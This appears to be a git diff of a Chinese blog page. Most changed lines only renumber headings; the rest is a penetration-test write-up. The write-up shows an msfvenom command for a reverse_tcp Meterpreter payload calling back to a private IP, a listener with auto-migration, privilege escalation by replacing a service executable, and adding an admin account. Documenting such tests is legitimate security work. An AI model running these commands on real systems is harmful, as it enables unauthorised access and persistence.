@@ -474,8 +474,8 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 在一次测试中，通过rce漏洞获得了目标主机meterpreter会话，尝试进行一些提权实验。过程中两台机子都不通外网，本文记录一下获得会话并提权过程。</p>
-<h4 id="2-获取msf会话"><a href="#2-获取msf会话" class="headerlink" title="2. 获取msf会话"></a>2. 获取msf会话</h4><p>生成一个exe载荷,看情况免杀：</p>
+                <h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h4><p> 在一次测试中，通过rce漏洞获得了目标主机meterpreter会话，尝试进行一些提权实验。过程中两台机子都不通外网，本文记录一下获得会话并提权过程。</p>
+<h4 id="2-获取msf会话"><a href="#2-获取msf会话" class="headerlink" title="2 获取msf会话"></a>2 获取msf会话</h4><p>生成一个exe载荷,看情况免杀：</p>
 <pre><code class="line-numbers language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=443 -f exe -o 666.exe
 </code></pre>
 <p>在准备让目标机执行我们的载荷前，先使用脚本(通过msfpc来生成)来快速监听会话，并进行一些自动进程迁移的工作：</p>
@@ -493,7 +493,7 @@ set AutoRunScript 'post/windows/manage/migrate'
 run -j
 </code></pre>
 <p>参数的具体含义可以在设置了payload后执行show advanced查看:<br><img src="https://i.loli.net/2020/09/06/5v9ztK1OHNwClrm.png"><br>开始监听：<br><img src="https://i.loli.net/2020/09/06/EUw2GiQyRmSAg5L.png"><br>在目标机上执行生成的exe,获取会话：<br><img src="https://i.loli.net/2020/09/06/CpsugnLKoOMDT42.png"></p>
-<h4 id="3-尝试提权"><a href="#3-尝试提权" class="headerlink" title="3. 尝试提权"></a>3. 尝试提权</h4><p>看了下目标已经是管理员权限了，如果要抓密码的话，得拿到system，准备试试。先ps看一下进程，发现有杀软，不过没关系，没有外网战力-50%:<br><img src="https://i.loli.net/2020/09/06/jKAURZu2DYNGSzV.png"><br>假装getsystem一下，whoami /priv 查看一下权限：<br><img src="https://i.loli.net/2020/09/06/2rCwVAfFNESi3hb.png" alt="getsystem"></p>
+<h4 id="3-尝试提权"><a href="#3-尝试提权" class="headerlink" title="3 尝试提权"></a>3 尝试提权</h4><p>看了下目标已经是管理员权限了，如果要抓密码的话，得拿到system，准备试试。先ps看一下进程，发现有杀软，不过没关系，没有外网战力-50%:<br><img src="https://i.loli.net/2020/09/06/jKAURZu2DYNGSzV.png"><br>假装getsystem一下，whoami /priv 查看一下权限：<br><img src="https://i.loli.net/2020/09/06/2rCwVAfFNESi3hb.png" alt="getsystem"></p>
 <p><img src="https://i.loli.net/2020/09/06/9eFRZGuTcUXVqAm.png" alt="whoami /priv"></p>
 <h5 id="local-exploit-suggester模块失败"><a href="#local-exploit-suggester模块失败" class="headerlink" title="local_exploit_suggester模块失败"></a>local_exploit_suggester模块失败</h5><p>试试自带的模块来检查提权漏洞：</p>
 <pre><code class="line-numbers language-shell">use post/multi/recon/local_exploit_suggester
@@ -515,8 +515,8 @@ shell&gt;net start wpscloudsvr
 <p><img src="https://i.loli.net/2020/09/06/kwdlUENItnpOHJ8.png"><br>这里就拿到了system权限的会话了：<br><img src="https://i.loli.net/2020/09/06/meE4iFVNKJnOBHf.png"></p>
 <p><img src="https://i.loli.net/2020/09/06/dj4W8KmTiaMIEtl.png"><br>后面就是上远程桌面看看，加个管理员账户什么的：<br><img src="https://i.loli.net/2020/09/06/orWRgGIUk7ZubB1.png"></p>
 <p><img src="https://i.loli.net/2020/09/06/6omMlNKGb3QZUz2.png"></p>
-<h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h4><p>1、使用metasploit脚本进行自动化设置<br>2、metasploit本地提权漏洞扫描、利用，相关信息收集模块使用；<br>3、服务可执行文件权限设置不当的cacls检查、exe-service载荷生成、替换执行提权。</p>
-<h4 id="5-参考"><a href="#5-参考" class="headerlink" title="5. 参考"></a>5. 参考</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/l1028386804/article/details/86669614">https://blog.csdn.net/l1028386804/article/details/86669614</a></p>
+<h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4 总结"></a>4 总结</h4><p>1、使用metasploit脚本进行自动化设置<br>2、metasploit本地提权漏洞扫描、利用，相关信息收集模块使用；<br>3、服务可执行文件权限设置不当的cacls检查、exe-service载荷生成、替换执行提权。</p>
+<h4 id="5-参考"><a href="#5-参考" class="headerlink" title="5 参考"></a>5 参考</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/l1028386804/article/details/86669614">https://blog.csdn.net/l1028386804/article/details/86669614</a></p>
 
             </div>
             <hr/>
@@ -1178,7 +1178,7 @@ shell&gt;net start wpscloudsvr
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">77.3k</span>&nbsp;字
+                class="white-color">87.2k</span>&nbsp;字
             
             
             
